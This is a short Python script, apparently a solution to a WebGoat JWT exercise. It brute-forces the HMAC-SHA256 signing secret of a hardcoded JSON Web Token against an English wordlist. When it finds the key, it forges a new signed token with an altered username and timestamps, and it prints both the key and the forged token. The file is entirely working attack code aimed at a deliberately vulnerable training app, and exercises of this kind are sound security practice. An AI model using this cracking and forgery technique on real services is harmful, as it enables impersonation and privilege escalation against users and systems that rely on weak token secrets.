import base64
import hashlib
import hmac


def crack():
    token = 'eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTYwODg2NjExMSwiZXhwIjoxNjA4ODY2MTcxLCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.KydWcl2xbGermGNn9YOTLj3lTNgUTLHOdunR8_oqTDo'.split('.')
    newpayload = '{"iss":"WebGoat Token Builder","aud":"webgoat.org","iat":1808866111,"exp":1609866171,"sub":"tom@webgoat.org","username":"WebGoat","Email":"tom@webgoat.org","Role":["Manager","Project Administrator"]}'.encode()
    unsigned_token = (token[0] + '.' + token[1]).encode()
    signature = (token[2] + '=' * (-len(token[2]) % 4)).encode()

    with open('google-10000-english.txt', 'r') as fd:
        lines = [line.rstrip('\n').encode() for line in fd]

    def hmac_base64(key, message):
        return base64.urlsafe_b64encode(bytes.fromhex(hmac.new(key, message, hashlib.sha256).hexdigest()))

    for line in lines:
        test = hmac_base64(line, unsigned_token)
        if test == signature:
            print('key {}'.format(line.decode()))
            new_token = (token[0] + '.' + base64.urlsafe_b64encode(newpayload).decode().rstrip('=')).encode()
            new_sig = hmac_base64(line, new_token)
            new_token += ('.' + new_sig.decode().rstrip('=')).encode()
            print('new token {}'.format(new_token.decode()))


if __name__ == '__main__':
    crack()
